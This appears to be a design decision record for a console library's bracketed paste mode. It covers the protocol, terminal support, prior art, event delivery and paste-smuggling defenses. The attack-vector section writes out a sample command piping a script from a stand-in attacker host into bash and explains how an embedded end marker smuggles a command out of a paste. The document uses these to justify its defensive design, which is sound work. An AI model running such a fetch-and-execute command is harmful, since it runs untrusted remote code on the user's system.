# Bracketed Paste Mode

<!--
---
version: 1.0.0
last_updated: 2026-03-03
status: DECISION
tier: 2
---
-->

## Context

The console library architecture ([console-library-architecture.md](console-library-architecture.md))
establishes that bracketed paste support is "opt-in at the event stream level, but on by
default in `Console.Line.Editor`." This document provides the detailed security analysis,
implementation survey, and design rationale for that decision.

Bracketed paste mode (DEC private mode 2004) allows terminal applications to distinguish
pasted text from typed input. Without it, pasted text is indistinguishable from rapid
keystrokes — including pasted newlines that can trigger command execution mid-paste.
This is a **security concern**, not merely a convenience feature.

## Question

How should the console library implement bracketed paste mode? What are the security
implications, the interaction with terminal multiplexers, and the correct event
delivery model?

Sub-questions:
1. Single event (`Paste(String)`) vs start/end marker events?
2. What paste smuggling defenses are needed?
3. Should it be opt-in or default-on?
4. How does it interact with tmux/screen?
5. What cleanup discipline is required?

## Analysis

### The Protocol

| Purpose | Sequence | Direction |
|---------|----------|-----------|
| Enable | `ESC [ ? 2004 h` | App → Terminal (stdout) |
| Disable | `ESC [ ? 2004 l` | App → Terminal (stdout) |
| Paste start | `ESC [ 200 ~` | Terminal → App (stdin) |
| Paste end | `ESC [ 201 ~` | Terminal → App (stdin) |

When enabled, the terminal wraps all pasted content with the start/end markers on stdin.
Normal typed input is completely unaffected. Terminals that don't understand mode 2004
simply ignore the enable sequence — the feature degrades gracefully.

### Security: Paste Injection Attacks

**Attack vector**: A malicious website replaces clipboard content via JavaScript. The user
copies what appears to be `ls -la` but the clipboard contains:
```
curl http://evil.com/payload.sh | bash\n
```
Without bracketed paste, the terminal delivers this as typed input and the newline triggers
immediate execution. The user never sees it.

**Known CVEs**:

| CVE | Product | Description |
|-----|---------|-------------|
| CVE-2018-4106 | macOS Terminal.app | Command injection via improper validation in bracketed paste mode |
| CVE-2019-17068 | PuTTY 0.72 | Start/end sequences delivered together with paste data following (not between) them |

### Security: Paste Smuggling

The most critical edge case. If pasted text itself contains `\x1b[201~` (the end marker),
the terminal may prematurely terminate the bracket:

1. App sees paste start `\x1b[200~`
2. Content: `harmless text`
3. Premature paste end `\x1b[201~`
4. `malicious command\n` — now interpreted as **typed input**

**Responsibility**: The terminal emulator MUST strip occurrences of `\x1b[201~` from
paste payloads. GNOME Terminal/VTE has always done this correctly. WezTerm was
[vulnerable](https://github.com/wezterm/wezterm/issues/4765) but has since been fixed.

**Defense in depth**: The receiving application SHOULD also validate that it does not see
apparent end-of-paste followed by data outside the brackets. This is our responsibility.

### Terminal Support Matrix

Support is near-universal (2002+):

| Terminal | Support Since | Notes |
|----------|--------------|-------|
| xterm | 2002 (patch #167) | Origin of the feature |
| GNOME Terminal/VTE | ~2012 | Correctly strips end markers from payloads |
| iTerm2 | ~2012 | Full support |
| Terminal.app | macOS 10.7 | Had CVE-2018-4106 |
| PuTTY | Feb 2012 | Had CVE-2019-17068, fixed in 0.73 |
| Windows Terminal | 2021 | Full support |
| Kitty, WezTerm, Alacritty, foot | Yes | Full support |

### Prior Art Survey

#### crossterm (Rust)

Delivers paste as `Event::Paste(String)` — the entire paste buffered and delivered as a
single event. Behind the `bracketed-paste` feature flag (enabled by default since 0.26).

```rust
fn parse_csi_bracketed_paste(buffer: &[u8]) -> io::Result<Option<InternalEvent>> {
    assert!(buffer.starts_with(b"\x1B[200~"));
    if !buffer.ends_with(b"\x1b[201~") {
        Ok(None)  // Incomplete, keep buffering
    } else {
        let paste = String::from_utf8_lossy(&buffer[6..buffer.len() - 6]).to_string();
        Ok(Some(InternalEvent::Event(Event::Paste(paste))))
    }
}
```

Key decisions:
- `Event::Paste(String)` over start/end marker events — app never manages paste state
- `from_utf8_lossy` — non-UTF-8 bytes get replacement characters
- Returns `None` for incomplete pastes, causing continued buffering

#### prompt_toolkit (Python) — Gold Standard

Uses a state machine with a dedicated paste buffer:
- When `\x1b[200~` arrives: set `_in_bracketed_paste = True`, **bypass the normal
  key parser entirely**, accumulate raw into paste buffer
- When `\x1b[201~` arrives: deliver `KeyPress(Keys.BracketedPaste, paste_content)`,
  recursively feed remaining input through normal parser
- Entire paste is a single undo unit in the editor

The bypass of the character-level parser during paste is both a performance optimization
and a correctness measure — pasted escape sequences are not interpreted as key bindings.

#### Fish Shell

Creates a dedicated `paste` binding mode. When `\x1b[200~` arrives, switches to this
mode where all input self-inserts (no key binding expansion). Pasted newlines become
literal newlines in the command buffer rather than triggering execution.

#### GNU Readline

Full support since Readline 8.1 (January 2021). Enabled by default. When active:
- No tab completion during paste
- No history expansion during paste
- Entire paste is a single undo unit

#### libedit (editline)

**No bracketed paste support**. Significant gap for BSD systems and macOS which use
libedit as the default line editor.

### Event Delivery Model Comparison

| Model | Used By | Pros | Cons |
|-------|---------|------|------|
| Single `Paste(String)` event | crossterm, prompt_toolkit | App never manages paste state; clean undo semantics | `Event` type loses `Copy` (heap-allocated String) |
| Start/end marker events | (none in modern practice) | Event type stays small | App must buffer manually; error-prone state management |

The industry has converged on `Paste(String)`. No modern library exposes start/end markers.

### Multiplexer Interaction

**tmux**: Tracks bracketed paste state per-pane. The `paste-buffer -p` flag emits
bracketed paste sequences when pasting into a pane whose application has requested the
mode. Known issues: `escape-time 0` can prevent proper sequence recognition. Legacy
`\033Ptmux;...\033\\` passthrough sequences bypass state tracking — remove them.

**GNU Screen**: Support added later than tmux. State tracking is less mature.

### Performance

Effectively **zero overhead**. Enabling is a 7-byte write. The terminal adds 12 bytes
(6 prefix + 6 suffix) per paste. No per-keystroke cost. Buffering during paste is
actually cheaper than character-by-character parsing.

### Cleanup on Crash

If the app crashes without disabling bracketed paste, subsequent applications receive
spurious `[200~...[201~` around pasted text. Mitigations:
1. User runs `printf '\x1b[?2004l'` or `reset`
2. Shell prompt hooks (zsh/fish re-enable before each prompt)
3. Signal handlers for SIGTERM/SIGINT — SIGKILL is inherently uncatchable

## Outcome

**Status**: DECISION

### Event Delivery

Deliver the entire paste as `Terminal.Input.Event.paste(String)`. The parser:
1. Detects `\x1b[200~` and enters paste accumulation mode
2. **Bypasses** normal key parsing — all bytes accumulate raw
3. On `\x1b[201~`, delivers the buffered content as a single event
4. Any remaining input after the end marker is fed back through normal parsing
5. Uses lossy UTF-8 decoding (replacement characters for invalid bytes)

### Defense in Depth

The parser MUST strip any occurrence of `\x1b[201~` within the paste payload before
delivering the event. This defends against paste smuggling even when the terminal
emulator fails to sanitize.

### Opt-In Policy

| Context | Bracketed Paste |
|---------|----------------|
| `Console.Events.Stream` default | Disabled |
| `Console.Events.Stream` opt-in | `configuration: .init(paste: .bracketed)` |
| `Console.Line.Editor` | Enabled by default (security) |
| `Console.Prompt.*` simple prompts | Disabled (not needed) |

Line editing enables it by default because pasted newlines in a line editor are a
security vector. Simple prompts don't need it because they typically read a single
line without interpreting special characters.

### Undo Integration

When integrated with `Console.Line.Editor`, the entire paste MUST be treated as a
single undo unit. Undoing a paste removes the entire pasted content, not character
by character.

### Lifecycle

- Enabling: `\x1b[?2004h` written to stdout when the event stream starts (if configured)
- Disabling: `\x1b[?2004l` written to stdout on cleanup
- Signal handlers (SIGTERM, SIGINT, SIGHUP) disable before exit
- Managed by `Console.Events.Stream` lifecycle — not manually by consumers

## References

- xterm bracketed paste specification: https://invisible-island.net/xterm/xterm-paste64.html
- CVE-2018-4106 (Apple Terminal): https://nvd.nist.gov/vuln/detail/CVE-2018-4106
- CVE-2019-17068 (PuTTY): https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-bracketed-paste-data-outside-brackets.html
- WezTerm paste smuggling: https://github.com/wezterm/wezterm/issues/4765
- crossterm bracketed paste: https://docs.rs/crossterm/latest/crossterm/event/index.html
- prompt_toolkit Vt100Parser: https://github.com/prompt-toolkit/python-prompt-toolkit/blob/master/src/prompt_toolkit/input/vt100_parser.py
- Fish shell bracketed paste: https://github.com/fish-shell/fish-shell/pull/3871
- Zsh bracketed-paste-magic: https://github.com/zsh-users/zsh/blob/master/Functions/Zle/bracketed-paste-magic
- tmux bracketed paste: https://github.com/tmux/tmux/issues/280
- Pastejacking: https://news.slashdot.org/story/16/05/24/2116209/pastejacking-attack-appends-malicious-terminal-commands-to-your-clipboard
- cirw.in bracketed paste blog: https://cirw.in/blog/bracketed-paste
